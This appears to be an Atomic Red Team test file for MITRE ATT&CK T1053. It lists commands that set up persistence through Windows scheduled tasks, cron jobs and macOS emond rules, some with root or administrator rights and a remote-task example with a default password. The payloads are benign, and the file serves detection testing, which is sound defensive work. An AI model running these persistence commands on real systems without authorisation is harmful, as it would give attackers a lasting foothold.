---
attack_technique: T1053
display_name: Scheduled Task/Job

atomic_tests:
- name: At.exe Scheduled task
  auto_generated_guid: 4a6c0dc4-0f2a-4203-9298-a5a9bdc21ed8
  description: |
    Executes cmd.exe
    Note: deprecated in Windows 8+

    Upon successful execution, cmd.exe will spawn at.exe and create a scheduled task that will spawn cmd at a specific time.
  supported_platforms:
    - windows
  executor:
    name: command_prompt
    elevation_required: false
    command: |
      at 13:20 /interactive cmd

- name: Scheduled task Local
  auto_generated_guid: 42f53695-ad4a-4546-abb6-7d837f644a71
  description: |
    Upon successful execution, cmd.exe will create a scheduled task to spawn cmd.exe at 20:10. 

  supported_platforms:
    - windows
  input_arguments:
    task_command:
      description: What you want to execute
      type: String
      default: C:\windows\system32\cmd.exe
    time:
      description: What time 24 Hour
      type: String
      default: 20:10
  executor:
    name: command_prompt
    elevation_required: true
    command: |
      SCHTASKS /Create /SC ONCE /TN spawn /TR #{task_command} /ST #{time}
    cleanup_command: |
      SCHTASKS /Delete /TN spawn /F >nul 2>&1

- name: Scheduled task Remote
  auto_generated_guid: 2e5eac3e-327b-4a88-a0c0-c4057039a8dd
  description: |
      Create a task on a remote system.

      Upon successful execution, cmd.exe will create a scheduled task to spawn cmd.exe at 20:10 on a remote endpoint. 
  supported_platforms:
    - windows
  input_arguments:
    task_command:
      description: What you want to execute
      type: String
      default: C:\windows\system32\cmd.exe
    time:
      description: What time 24 Hour
      type: String
      default: 20:10
    target:
      description: Target
      type: String
      default: localhost
    user_name:
      description: Username DOMAIN\User
      type: String
      default: DOMAIN\user
    password:
      description: Password
      type: String
      default: At0micStrong
  executor:
    name: command_prompt
    elevation_required: true
    command: |
      SCHTASKS /Create /S #{target} /RU #{user_name} /RP #{password} /TN "Atomic task" /TR "#{task_command}" /SC daily /ST #{time}
    cleanup_command: |
      SCHTASKS /Delete /TN "Atomic task" /F >nul 2>&1

- name: Powershell Cmdlet Scheduled Task
  auto_generated_guid: af9fd58f-c4ac-4bf2-a9ba-224b71ff25fd
  description: |
    Create an atomic scheduled task that leverages native powershell cmdlets.
    
    Upon successful execution, powershell.exe will create a scheduled task to spawn cmd.exe at 20:10. 

  supported_platforms:
    - windows
  executor:
    name: powershell
    elevation_required: false
    command: |
      $Action = New-ScheduledTaskAction -Execute "calc.exe"
      $Trigger = New-ScheduledTaskTrigger -AtLogon
      $User = New-ScheduledTaskPrincipal -GroupId "BUILTIN\Administrators" -RunLevel Highest
      $Set = New-ScheduledTaskSettingsSet
      $object = New-ScheduledTask -Action $Action -Principal $User -Trigger $Trigger -Settings $Set
      Register-ScheduledTask AtomicTask -InputObject $object
    cleanup_command: |
      Unregister-ScheduledTask -TaskName "AtomicTask" -confirm:$false >$null 2>&1

- name: Cron - Replace crontab with referenced file
  auto_generated_guid: 435057fb-74b1-410e-9403-d81baf194f75
  description: |
    This test replaces the current user's crontab file with the contents of the referenced file. This technique was used by numerous IoT automated exploitation attacks.

  supported_platforms:
    - macos
    - linux

  input_arguments:
    command:
      description: Command to execute
      type: string
      default: /tmp/evil.sh
    tmp_cron:
      description: Temporary reference file to hold evil cron schedule
      type: path
      default: /tmp/persistevil

  executor:
    name: bash
    command: |
      echo "* * * * * #{command}" > #{tmp_cron} && crontab #{tmp_cron}

- name: Cron - Add script to cron folder
  auto_generated_guid: b7d42afa-9086-4c8a-b7b0-8ea3faa6ebb0
  description: |
    This test adds a script to a cron folder configured to execute on a schedule. This technique was used by the threat actor Rocke during the exploitation of Linux web servers.

  supported_platforms:
    - macos
    - linux

  input_arguments:
    command:
      description: Command to execute
      type: string
      default: echo 'Hello from Atomic Red Team' > /tmp/atomic.log
    cron_script_name:
      description: Name of file to store in cron folder
      type: string
      default: persistevil

  executor:
    name: bash
    command: |
      echo "#{command}" > /etc/cron.daily/#{cron_script_name}

- name: Event Monitor Daemon Persistence
  auto_generated_guid: 11979f23-9b9d-482a-9935-6fc9cd022c3e
  description: |
    This test adds persistence via a plist to execute via the macOS Event Monitor Daemon. 

  supported_platforms:
    - macos
    - linux

  executor:
    name: manual
    steps: |
      1. Place this file in /etc/emond.d/rules/atomicredteam.plist
      <?xml version="1.0" encoding="UTF-8"?>
      <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
      <plist version="1.0">
      <array>
          <dict>
              <key>name</key>
              <string>atomicredteam</string>
              <key>enabled</key>
              <true/>
              <key>eventTypes</key>
              <array>
                  <string>startup</string>
              </array>
              <key>actions</key>
              <array>
                  <dict>
                      <key>command</key>
                      <string>/usr/bin/say</string>
                      <key>user</key>
                      <string>root</string>
                      <key>arguments</key>
                          <array>
                              <string>-v Tessa</string>
                              <string>I am a persistent startup item.</string>
                          </array>
                      <key>type</key>
                      <string>RunCommand</string>
                  </dict>
              </array>
          </dict>
      </array>
      </plist>

      2. Place an empty file in /private/var/db/emondClients/

      3. sudo touch /private/var/db/emondClients/randomflag